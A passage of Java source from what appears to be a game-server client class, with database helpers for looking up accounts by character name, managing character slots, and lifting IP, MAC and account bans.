            int start = builder.indexOf("{}");
            builder.replace(start, start + 2, parm.toString());
        }
        return builder.toString();
    }

    public static final int findAccIdForCharacterName(String charName) {
        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("SELECT accountid FROM characters WHERE name = ?");
            ps.setString(1, charName);
            ResultSet rs = ps.executeQuery();
            int ret = -1;
            if (rs.next()) {
                ret = rs.getInt("accountid");
            }
            rs.close();
            ps.close();
            return ret;
        }
        catch (SQLException e) {
            System.err.println("findAccIdForCharacterName SQL error");
            return -1;
        }
    }

    public final Set<String> getMacs() {
        return Collections.unmodifiableSet(this.macs);
    }

    public final boolean isGm() {
        return this.gm;
    }

    public final void setScriptEngine(String name, ScriptEngine e) {
        this.engines.put(name, e);
    }

    public final ScriptEngine getScriptEngine(String name) {
        return this.engines.get(name);
    }

    public final void removeScriptEngine(String name) {
        this.engines.remove(name);
    }

    public final ScheduledFuture<?> getIdleTask() {
        return this.idleTask;
    }

    public final void setIdleTask(ScheduledFuture<?> idleTask) {
        this.idleTask = idleTask;
    }

    public int getCharacterSlots() {
        if (this.isGm()) {
            return 15;
        }
        if (this.charslots != 6) {
            return this.charslots;
        }
        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("SELECT * FROM character_slots WHERE accid = ? AND worldid = ?");
            ps.setInt(1, this.accId);
            ps.setInt(2, this.world);
            ResultSet rs = ps.executeQuery();
            if (rs.next()) {
                this.charslots = rs.getInt("charslots");
            } else {
                PreparedStatement psu = con.prepareStatement("INSERT INTO character_slots (accid, worldid, charslots) VALUES (?, ?, ?)");
                psu.setInt(1, this.accId);
                psu.setInt(2, this.world);
                psu.setInt(3, this.charslots);
                psu.executeUpdate();
                psu.close();
            }
            rs.close();
            ps.close();
        }
        catch (SQLException sqlE) {
            sqlE.printStackTrace();
        }
        return this.charslots;
    }

    public boolean gainCharacterSlot() {
        if (this.getCharacterSlots() >= 15) {
            return false;
        }
        ++this.charslots;
        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("UPDATE character_slots SET charslots = ? WHERE worldid = ? AND accid = ?");
            ps.setInt(1, this.charslots);
            ps.setInt(2, this.world);
            ps.setInt(3, this.accId);
            ps.executeUpdate();
            ps.close();
        }
        catch (SQLException sqlE) {
            sqlE.printStackTrace();
            return false;
        }
        return true;
    }

    public static final byte unbanIPMacs(String charname) {
        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("SELECT accountid from characters where name = ?");
            ps.setString(1, charname);
            ResultSet rs = ps.executeQuery();
            if (!rs.next()) {
                rs.close();
                ps.close();
                return -1;
            }
            int accid = rs.getInt(1);
            rs.close();
            ps.close();
            ps = con.prepareStatement("SELECT * FROM accounts WHERE id = ?");
            ps.setInt(1, accid);
            rs = ps.executeQuery();
            if (!rs.next()) {
                rs.close();
                ps.close();
                return -1;
            }
            String sessionIP = rs.getString("sessionIP");
            String macs = rs.getString("macs");
            rs.close();
            ps.close();
            byte ret = 0;
            if (sessionIP != null) {
                PreparedStatement psa = con.prepareStatement("DELETE FROM ipbans WHERE ip = ?");
                psa.setString(1, sessionIP);
                psa.execute();
                psa.close();
                ret = (byte)(ret + 1);
            }
            if (macs != null) {
                String[] macz;
                for (String mac : macz = macs.split(", ")) {
                    if (mac.equals("")) continue;
                    PreparedStatement psa = con.prepareStatement("DELETE FROM macbans WHERE mac = ?");
                    psa.setString(1, mac);
                    psa.execute();
                    psa.close();
                }
                ret = (byte)(ret + 1);
            }
            return ret;
        }
        catch (SQLException e) {
            System.err.println("Error while unbanning" + e);
            return -2;
        }
    }

    public static final byte unHellban(String charname) {
        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("SELECT accountid from characters where name = ?");
            ps.setString(1, charname);
            ResultSet rs = ps.executeQuery();
            if (!rs.next()) {
                rs.close();
                ps.close();
                return -1;
            }
            int accid = rs.getInt(1);
            rs.close();
            ps.close();
            ps = con.prepareStatement("SELECT * FROM accounts WHERE id = ?");
            ps.setInt(1, accid);
            rs = ps.executeQuery();
            if (!rs.next()) {
                rs.close();
                ps.close();
                return -1;
            }
            String sessionIP = rs.getString("sessionIP");
            String email = rs.getString("email");
            rs.close();
            ps.close();
            ps = con.prepareStatement("UPDATE accounts SET banned = 0, banreason = '' WHERE email = ?" + (sessionIP == null ? "" : " OR sessionIP = ?"));
            ps.setString(1, email);
            if (sessionIP != null) {
                ps.setString(2, sessionIP);
            }
            ps.execute();
            ps.close();
            return 0;
        }
        catch (SQLException e) {
            System.err.println("Error while unbanning" + e);
            return -2;
        }
    }

    public boolean isMonitored() {
        return this.monitored;
    }

    public void setMonitored(boolean m) {
        this.monitored = m;
    }

    public boolean isReceiving() {
        return this.receiving;
    }

    public void setReceiving(boolean m) {
        this.receiving = m;
    }

    protected static final class CharNameAndId {
        public final String name;
        public final int id;

        public CharNameAndId(String name, int id) {
            this.name = name;
            this.id = id;
        }
    }
}

